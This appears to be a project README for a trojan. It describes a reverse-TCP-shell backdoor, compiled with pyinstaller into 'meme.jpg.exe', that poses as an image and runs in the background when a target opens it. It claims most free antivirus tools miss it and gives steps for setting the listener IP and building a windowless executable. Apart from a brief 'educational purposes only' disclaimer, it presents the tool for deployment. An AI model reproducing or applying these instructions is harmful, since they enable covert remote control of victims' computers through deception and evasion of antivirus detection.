 _**Disclaimer**: The project serves for educational purposes only. By dowloading the project, I am not taking responsibility for any impacts._

# Description
A custom backdoor payload.
Check `dist` folder for compiled files.

It contains `server.py`, which is needed for listening for upcoming connection. The connection is established using reverse TCP shell.

File `meme.jpg.exe` is a compiled file from `backdoor.py` and image `meme.jpg`, which are compressed into one file. 
File `meme.jpg.exe` must be opened by target machine. It behaves like common image, but as soon as file is opened, the backdoor exploit is run in the background. This is not recognized by most of the free antivirus vendors so far.

# Configuration
1. In `server.py` and `backdoor.py` check for socket listener IP. The default one is `192.168.1.17`.
2. Compile files using `pyinstaller <file_name> --onefile --noconsole`.

